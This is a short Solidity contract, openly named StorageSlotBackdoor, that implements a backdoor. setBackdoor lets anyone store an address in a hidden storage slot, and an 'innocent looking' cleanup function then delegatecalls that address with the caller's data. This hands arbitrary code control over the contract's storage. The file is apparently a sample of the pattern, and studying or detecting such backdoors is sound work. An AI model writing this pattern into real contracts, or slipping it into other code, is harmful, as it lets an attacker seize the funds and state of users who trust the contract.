// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StorageSlotBackdoor {
    // Hidden slot
    bytes32 constant HIDDEN_SLOT = 0x1122334455667788990011223344556677889900112233445566778899001122;

    function setBackdoor(address _backdoor) external {
        assembly {
            sstore(HIDDEN_SLOT, _backdoor)
        }
    }

    function cleanup() external {
        // Innocent looking function that triggers the backdoor if set
        assembly {
            let _impl := sload(HIDDEN_SLOT)
            if iszero(iszero(_impl)) {
                calldatacopy(0, 0, calldatasize())
                let result := delegatecall(gas(), _impl, 0, calldatasize(), 0, 0)
                // If it returns, we continue, but side effects happened
            }
        }
    }
}
